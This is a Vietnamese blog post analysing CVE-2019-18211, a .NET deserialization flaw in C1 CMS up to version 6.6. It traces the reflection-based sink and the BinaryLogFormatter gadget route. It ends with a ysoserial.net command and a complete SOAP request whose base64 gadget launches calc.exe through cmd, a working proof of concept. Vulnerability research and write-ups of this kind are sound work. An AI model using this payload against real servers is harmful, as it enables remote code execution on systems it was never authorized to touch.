# Góc xàm xí
Nghe cái tiêu đề ngầu thế thôi. Chứ thực ra đối với các pro rồi thì bài viết này cũng chỉ là múa rìu qua mắt thợ mà thôi nha. 
Dạo gần đây thì mình cũng có bắt đầu đi học cái lỗ hổng .NET deserialization, và tất nhiên chỉ đọc lý thuyết không thì chẳng nên cơm nên cháo gì được. Nên mình thì cũng tìm kiếm các bài viết, bài phân tích về lỗ hổng này trong thực tế (yeah, chính là các cái CVE đó). Và rồi mình gặp bài viết này [https://medium.com/@frycos/yet-another-net-deserialization-35f6ce048df7](https://medium.com/@frycos/yet-another-net-deserialization-35f6ce048df7). Mở cho mình một hướng suy nghĩ mới trong việc tìm bug về .NET deserialization. Nhắc lại là đối với mình thôi nhé, vì có lẽ cũng nhiều người biết rồi. Mà không sao, mình là người học mà, thấy hay thì mình chia sẻ thôi. Oke, bắt đầu thôi. 
# Giới thiệu


Thông qua bài viết thì chúng ta được biết là bug tồn tại trong sản phẩm C1 CMS của Orckestra, và trong các version <=6.6. Bây giờ thì sản phẩm đã được cập nhật lên version 6.10 rồi. Giới thiệu qua một chút về thằng C1 CMS này thì **C1 CMS is one of the top rated open source CMS worldwide** được xây dựng dựa trên Microsoft stack với hơn 85000 lợt tải về. Để tải các phiên bản của nó về thì các bạn có thể theo link sau: [https://github.com/Orckestra/C1-CMS-Foundation/releases/tag/v6.10](https://github.com/Orckestra/C1-CMS-Foundation/releases/tag/v6.10)

# Setup debug
Về công việc dựng lại môi trường để debug cve này rất đơn giản, các bạn chỉ cần tải về và chạy bằng Rider là xong. Mình sẽ nói chi tiết ở bên dưới nhé.
## Setup server

Sau khi tải về, giải nén các bạn Click chuột phải vào folder C1.CMS.6.6 => open folder as Jetbrain Rider project

![](https://images.viblo.asia/38824b8a-43d5-4226-964a-7a2bf8638468.png)

Load project vào và chạy lên thôi thế là xong server rồi

![image.png](https://images.viblo.asia/96ff8d21-65db-4afa-945e-6a7f7855bc05.png)

![](https://images.viblo.asia/3007cd50-82ab-41d4-829a-335cfdbaa3cc.png)

## Setup client

Ở đây mình vẫn sử dụng Rider để chạy (Lưu ý là phải chạy Rider với quyền admin nhé). Mở Rider lên và attach process như hình dưới

![](https://images.viblo.asia/38246d76-49d7-4ade-838f-9baa8ef237c8.png)

Chờ nó load assemblies xong là xong rồi

![](https://images.viblo.asia/c144fd1e-db45-4f40-8448-5049270a5af6.png)

Vậy là xong phần setup rồi đó. Bây giờ đến phần phân tích và là trọng tâm bài viết này thôi

# Phân tích CVE-2019-18211
Điểm trigger của CVE này nằm ở Method **EntityTokenSerializer.DeserializeLegacy**. 

![](https://images.viblo.asia/19b9bcf4-aec1-4b0e-90c4-802cfacf5711.png)

Các bạn thấy điểm đặc biệt gì không. Đoạn code trên sử dụng Reflection để gọi đến 1 method tên là **Deserialize** static và có 1 tham số. Vấn đề nằm ở chỗ chúng ta hoàn toàn có thể lợi dụng đoạn code này để gọi đến method `Deserialize` của class bất kì miễn thỏa mãn là static và có 1 tham số. Đi sâu hơn vào phân tích đoạn code này:

>Dictionary<string, string> keyValueCollection = StringConversionServices.ParseKeyValueCollection(serializedEntityToken);

Ở dòng 61 có nhiệm vụ chuyển chuỗi `serializedEntityToken` từ dạng string thành 1 dictionary có key và value đều ở dạng string

>string fullName = keyValueCollection.ContainsKey("entityTokenType") && keyValueCollection.ContainsKey("entityToken") && (!includeHashValue || keyValueCollection.ContainsKey("entityTokenHash")) ? StringConversionServices.DeserializeValueString(keyValueCollection["entityTokenType"]) : throw new ArgumentException("Failed to deserialize the value. Is has to be serialized with EntityTokenSerializer.", nameof (serializedEntityToken));

Dòng 62 sẽ lấy ra biến `fullname` (quan trọng nha vì nó sẽ chỉ định .NET assembly nào sẽ được sử dụng như là type cho quá trình deserialization) thỏa mãn đồng thời các điều kiện sau:

* keyValueCollection phải chưa key có tên **entityToken**, **entityTokenType**
* includeHashValue là false hoặc keyValueCollection có chưa key có tên **entityTokenHash**

Tất nhiên giá trị keyValueCollection["entityTokenType"] phải qua thỏa mãn regular expression sau thì mới được set cho biến **fullName**
>_keyValuePairRegExPattern = "\\s*(?<Key>[^=\\s]*)\\s*=\\s*(?<IsNull>null|'(?<Value>[^'\\\\\\r\\n]*(\\\\.[^'\\\\\\r\\n]*)*)')\\s*,*\\s*";
    
Dòng 63 sẽ lấy ra content từ keyValueCollection["entityToken"]. Tất nhiên cũng phải thỏa mãn regex. Biến này đóng vai trò là giá trị của tham số trong lời gọi hàm deserialize
>string content = StringConversionServices.DeserializeValueString(keyValueCollection["entityToken"]);

Dòng 70,71 sẽ lấy ra type từ fullname và method có tên là **deserialize**
>Type type = TypeManager.GetType(fullName);
    
>MethodInfo method = type.GetMethod("Deserialize", BindingFlags.Static | BindingFlags.Public);
    
Ok thế là đã hiểu ý tưởng rồi phải không. Việc tiếp theo là chúng ta cần tìm một method **Deserialize** thỏa mãn điều kiện là 1 static method và nhận 1 tham số dạng string. Và method **Deserialize** của chúng ta nằm ở **Microsoft.Practices.EnterpriseLibrary.Logging.Formatters.BinaryLogFormatter**. 

![](https://images.viblo.asia/e97e8a81-5ab7-47d0-9a28-b94e641aae39.png)

Các bạn để ý thì thằng `Deserialize` này nhận đầu vào là 1 chuỗi được mã hóa base 64. 
    
Tổng kết lại thì từ chuỗi `serializedEntityToken` chúng ta cần parse ra được `fullName = Microsoft.Practices.EnterpriseLibrary.Logging.Formatters.BinaryLogFormatter tức là keyValueCollection["entityTokenType"] =  Microsoft.Practices.EnterpriseLibrary.Logging.Formatters.BinaryLogFormatter` và `keyValueCollection["entityToken"] = base64(payloadGadget)` 
    
# Tìm injection point
    
Chúng ta đã chứng minh được điểm trigger của chúng ta là khả thi, vấn đề tiếp theo cần xử lý là phải tìm được nơi mà chúng ta control được dữ liệu đầu vào và truyền vào **EntityTokenSerializer.DeserializeLegacy**. Đọc bài phân tích của tác giả thì ta được biết nó nằm ở **TreeServicesFacade.GetMultipleChildren**
    
![image.png](https://images.viblo.asia/ff26cf01-4b24-4afa-a94f-0070b0658335.png)
    
Tìm kiếm thêm về nơi **TreeServicesFacade.GetMultipleChildren** được gọi thì được như sau:
    
![image.png](https://images.viblo.asia/18e829da-8a1b-47c5-b00c-f6a94e2d7fce.png)
    
**TreeServicesFacade.GetMultipleChildren** được gọi ở **TreeServices.GetMultipleChildren**. Chú ý thêm về vị trí của lớp này
    
![image.png](https://images.viblo.asia/31b31a10-f70b-420b-a79a-0ae44472bb25.png)
    
Chúng ta thử truy cập theo đường dẫn trên thì được 
    
![image.png](https://images.viblo.asia/14639382-5d13-49b9-85c1-a1c97e97ddd2.png)
    
Có vẻ đây là 1 Soap Service. Chúng ta sẽ thực hiện theo ví dụ mà chúng ta nhận được và chèn payload của chúng ta vào body của request. 
Ở đây mình dùng gadget `DataSet` trong ysoserial .net để poc lại cho CVE này: `.\ysoserial.exe -g DataSet -f BinaryFormatter -c calc.exe -o base64`
    
request sẽ có sạng sau đây:
    
```
POST /Composite/services/Tree/TreeServices.asmx HTTP/1.1
Host: localhost
Content-Type: text/xml; charset=utf-8
Content-Length: 2678
Cookie: .CMSAUTH_1208797920_757602046=EF14B7348542DCA4C4F287EBCD8625FB9A17B7F65CB785273B576F5171744185FAFFE8B45C52778A6CF6D3C034EAF8E9CC74F1A33358A8B4839ED3E47379B883C8C6A57FEB233FC4BEC333896E1207502F5B35CE4611FB344C0FD2748AE0ACAC; CompositeVersionString_1208797920_757602046=6.6.6912.30810; mode_1208797920_757602046=operate
SOAPAction: "http://www.composite.net/ns/management/GetMultipleChildren"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetMultipleChildren xmlns="http://www.composite.net/ns/management">
      <clientProviderNameEntityTokenPairs>
        <RefreshChildrenParams>
          <ProviderName>string</ProviderName>
          <EntityToken>entityTokenType='Microsoft.Practices.EnterpriseLibrary.Logging.Formatters.BinaryLogFormatter' entityToken='AAEAAAD/////AQAAAAAAAAAMAgAAAE5TeXN0ZW0uRGF0YSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAABNTeXN0ZW0uRGF0YS5EYXRhU2V0CgAAABZEYXRhU2V0LlJlbW90aW5nRm9ybWF0E0RhdGFTZXQuRGF0YVNldE5hbWURRGF0YVNldC5OYW1lc3BhY2UORGF0YVNldC5QcmVmaXgVRGF0YVNldC5DYXNlU2Vuc2l0aXZlEkRhdGFTZXQuTG9jYWxlTENJRBpEYXRhU2V0LkVuZm9yY2VDb25zdHJhaW50cxpEYXRhU2V0LkV4dGVuZGVkUHJvcGVydGllcxREYXRhU2V0LlRhYmxlcy5Db3VudBBEYXRhU2V0LlRhYmxlc18wBAEBAQAAAAIABx9TeXN0ZW0uRGF0YS5TZXJpYWxpemF0aW9uRm9ybWF0AgAAAAEIAQgCAgAAAAX9////H1N5c3RlbS5EYXRhLlNlcmlhbGl6YXRpb25Gb3JtYXQBAAAAB3ZhbHVlX18ACAIAAAABAAAABgQAAAAACQQAAAAJBAAAAAAJBAAAAAoBAAAACQUAAAAPBQAAAJQDAAACAAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAtgU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtOCI/Pg0KPE9iamVjdERhdGFQcm92aWRlciBNZXRob2ROYW1lPSJTdGFydCIgSXNJbml0aWFsTG9hZEVuYWJsZWQ9IkZhbHNlIiB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiB4bWxuczpzZD0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9U3lzdGVtIiB4bWxuczp4PSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCI+DQogIDxPYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U+DQogICAgPHNkOlByb2Nlc3M+DQogICAgICA8c2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgICAgIDxzZDpQcm9jZXNzU3RhcnRJbmZvIEFyZ3VtZW50cz0iL2MgY2FsYy5leGUiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M+DQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI+Cws='</EntityToken>
          <Piggybag>string</Piggybag>
          <SearchToken>string</SearchToken>
        </RefreshChildrenParams>
      </clientProviderNameEntityTokenPairs>
    </GetMultipleChildren>
  </soap:Body>
</soap:Envelope>
  ```
    
Bật lên calc là thành công rồi nhé:
    
Poc tí cho uy tín
![image.png](https://images.viblo.asia/8e43894e-b612-4f8c-8eb5-072ef1bfc5f0.png)

# Tổng kết 
    
Với các bạn thắc mắc cái chỗ mà mình bảo là think out of the box nó nằm ở chỗ nào thì mình xin trả lời là nó nằm ở cái chỗ gọi reflection kia kìa. Theo lối mòn suy nghĩ thì mình sẽ tìm các hàm deserialize nguy hiểm và trace ngược lại xem hàm nào gọi đến nó cho đến khi chạm được đến nơi user control được. Và nếu mình làm vậy thì rõ ràng mình đã sót mất cái trường hợp của CVE này. Mình thấy hay và nó giúp mình thoát khỏi cái lối suy nghĩ cứng nhắc là phải gọi đến hàm deserialize thì mới dính lỗi. Thế đấy. Cảm ơn các bạn đã đọc đến đây nha.